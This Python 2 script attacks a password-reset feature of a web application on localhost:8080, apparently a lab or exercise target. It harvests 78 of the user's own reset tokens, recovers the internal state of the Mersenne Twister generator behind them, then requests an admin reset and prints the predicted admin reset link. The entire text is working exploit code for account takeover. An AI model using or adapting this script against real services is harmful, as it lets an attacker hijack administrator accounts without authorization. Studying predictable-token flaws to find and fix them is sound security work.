import urllib
import urllib2
from binascii import a2b_base64, b2a_uu
import base64

def rshift(val, n): return val>>n if val >= 0 else (val+0x100000000)>>n


def registerAccount(user, password):
   url = 'http://localhost:8080/register'
   values = {'user': user, 'password': password}
   data = urllib.urlencode(values)
   req = urllib2.Request(url, data)
   response = urllib2.urlopen(req)

#return token string
def forgotPasswordUser(user):
   url = 'http://localhost:8080/forgot'
   values = {'user': user}
   data = urllib.urlencode(values)
   req = urllib2.Request(url, data)
   response = urllib2.urlopen(req)
   the_page = response.read()
   start = '<!--open_token-->localhost:8080/reset?token='
   end = '<!--close_token-->'
   return the_page.split(start)[1].split(end)[0]

def reverseRight(value, shift):
   #you know that the first "SHIFT" number of bits were unaffected by the original temper, so use those "SHIFT" bits to further unlock more pieces of the MT, and then once you unlocked more pieces you have "SHIFT times x" bits unlocked which can used to unlock the remaining pices
   count = 0
   result = value
   while (shift * count < 32):
      unveilBits = result >> shift 
      result = value ^ unveilBits
      count += 1
   return result
   
def reverseLeft(value, shift, mask):
   count = 0
   result = value
   while (shift * count < 32):
       unveilBits = result << shift
       result = value ^ (unveilBits & mask)
       count += 1
   return result

def reverseMTval(val):
   val = reverseRight(val, 18)
   val = reverseLeft(val, 15, 0xefc60000)
   val = reverseLeft(val, 7, 0x9d2c5680)
   val = reverseRight(val, 11)
   return val

def extract_num(val):
   y = val
   y = y ^ (y >> 11)
   y = y ^ (y << 7 & (2636928640))
   y = y ^ (y << 15 & (4022730752))
   y = y ^ (y >> 18)
   return y

def main():
   user = 'matthew'
   password = '123'
   registerAccount(user, password)
   b64vals = []
   MTvals = []
   for x in range(0,78):
      b64vals.append(forgotPasswordUser(user))
   
   for i in b64vals:
      for val in base64.b64decode(i).split(':'):
         MTvals.append(int(val))
   
   #print(len(MTvals))
   for x in range(0, len(MTvals)):
      MTvals[x] = reverseMTval(MTvals[x])
      
   #for val in MTvals:
      #print(val)
   
   url = 'http://localhost:8080/forgot'
   values = {'user': 'admin'}
   data = urllib.urlencode(values)
   req = urllib2.Request(url, data)
   response = urllib2.urlopen(req)

   #regenerate the tokens now that known generator
   for i in range(0, 624):
            y = (MTvals[i] & 0x80000000) + (MTvals[(i + 1) % 624] & 0x7fffffff)
            MTvals[i] = MTvals[(i + 397) % 624] ^ (y >> 1)
            if (y % 2) != 0:
                MTvals[i] = (MTvals[i] ^ 2567483615)
                
   tokenStr = (str(extract_num(MTvals[0])))
   for ct in range(1, 8):
      tokenStr += ":" + (str(extract_num(MTvals[ct])))
   
   print("admin token is: localhost:8080/reset?token=" + base64.b64encode(tokenStr))
   
main()
